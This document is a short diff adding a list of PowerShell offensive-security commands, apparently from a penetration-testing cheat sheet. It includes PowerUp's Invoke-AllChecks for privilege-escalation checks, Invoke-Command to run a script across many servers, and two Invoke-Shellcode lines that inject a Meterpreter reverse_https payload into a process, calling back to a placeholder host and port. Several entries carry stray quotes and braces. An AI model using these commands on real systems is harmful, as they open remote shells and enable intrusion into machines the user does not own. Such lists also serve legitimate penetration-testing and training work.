@@ -1,0 +1,8 @@
+"Invoke-AllChecks"""
+"Invoke-AllChecks}"""
+"Invoke-Command -ComputerName (Get-Content <list of servers> ) -FilePath <path to script> - ArgumentList <arg1,arg2>	"
+"Invoke-ShellCode"""
+"Invoke-Shellcode.ps1"")"
+Invoke-Command -ComputerName (Get-Content <list of servers> ) -FilePath <path to script> -AsJob	
+Invoke-Shellcode -ProcessId <process id> -payload windows/meterpreter/reverse_https -Lhost <ip> -Lport <port> -Force
+Invoke-Shellcode -payload windows/meterpreter/reverse_https -Lhost <ip> -Lport <port> -Force
